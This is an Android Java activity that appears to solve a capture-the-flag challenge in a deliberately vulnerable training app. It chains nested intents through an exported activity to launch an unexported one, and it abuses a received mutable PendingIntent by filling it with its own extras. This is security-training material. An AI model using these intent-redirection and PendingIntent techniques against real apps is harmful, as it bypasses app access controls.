package com.appdev.intentattacks;

import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

public class Flag23Activity extends AppCompatActivity {
    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_flag23);
        Button launchButton = findViewById(R.id.btnLaunchFlag23);
        launchButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                // Start the unexported activity using flag 5 activity.
                Intent intent1 = new Intent();
                Intent intent2 = new Intent();
                Intent intent3 = new Intent();
                intent1.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag5Activity"));
                intent2.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag5Activity"));
                intent3.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag23Activity"));
                intent3.putExtra("reason", "next");
                intent2.putExtra("nextIntent", intent3);
                intent2.putExtra("return", 42);
                intent1.putExtra("android.intent.extra.INTENT", intent2);
                startActivity(intent1);
            }
        });
        if(getIntent().getExtras() != null) {
            Intent intent = getIntent();
            Utils.showDialog(this, intent);
            PendingIntent pendingIntent = intent.getParcelableExtra("pending_intent");
            Intent mutableIntent = new Intent();
            mutableIntent.putExtra("code", 42);
            try {
                pendingIntent.send(this, 0, mutableIntent);
            } catch (PendingIntent.CanceledException e) {
                throw new RuntimeException(e);
            }
        }
    }
}